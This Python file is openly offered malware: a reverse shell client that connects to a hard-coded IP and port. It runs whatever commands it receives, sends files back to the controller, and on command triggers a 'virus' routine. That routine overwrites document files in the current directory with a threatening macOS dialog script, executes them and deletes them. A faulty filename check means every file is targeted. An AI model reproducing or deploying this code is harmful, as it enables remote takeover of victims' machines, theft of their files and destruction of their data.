import socket
import os
import sys
import subprocess
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip ='192.168.8.100' #host
port = 6666
s.connect((ip, port))

def virus():
    
    # Virus Begins
    directory = os.listdir('.')
    #print(directory)
    
    targets=[]
    
    for file in directory:
        if '.txt' in file or '.docx'   or '.pdf'in file:
            print("[+] {} is a potential target ... ".format(file))
            targets.append(file)
    #print('[+][+] all targets are : {}'.format(str(targets)))
    
    for target in targets:
        target_file = open(target,'w')
        #print('file opened ...')
        #xb ="\necho \'message to execute a command  VIRUS...\'{}".format(target)
        xb ="osascript -e " +"\'tell app "+ "\"System Events\" "+"to display dialog "+"\"VIRUS ...I WILL DELETE YOUR DATA in 10 seonds\"\n{}"+"\'".format(target)
        target_file.write(xb)
        #print('command injected ...')
        #target_file.write("\necho \'message to execute a command  VIRUS...\'{}".format(target))
        target_file.close()
        #print('file closed ...')
        
        # learning purposes
        p = subprocess.Popen(['chmod','ugo+x',target],stdin=subprocess.PIPE)
        
        
        os.system('./{}'.format(str(target)))
        time.sleep(10)
        os.system('rm {}'.format(str(target)))
        
    # Virus Ends    

while True:
    data = s.recv(2048)

    #command['cd','..']
 #########################################
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if 'download' in data.decode('utf-8'):
        with open(data[9:].decode('utf-8'),'r') as f:
            l = f.read()
            if l:
                s.sendall(l)
            else:
                break
            #s.send('')
            f.close()
            time.sleep(20)
            break
        time.sleep(5)
        s.close()

    if 'virus' in data.decode('utf-8'):
        virus()

    if len(data) > 0:

    ##############################

        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin= subprocess.PIPE)

        output = cmd.stdout.read() + cmd.stderr.read()

        s.send(str.encode(output + str(os.getcwd())) + '>')

        ##############
        #print output

s.close()
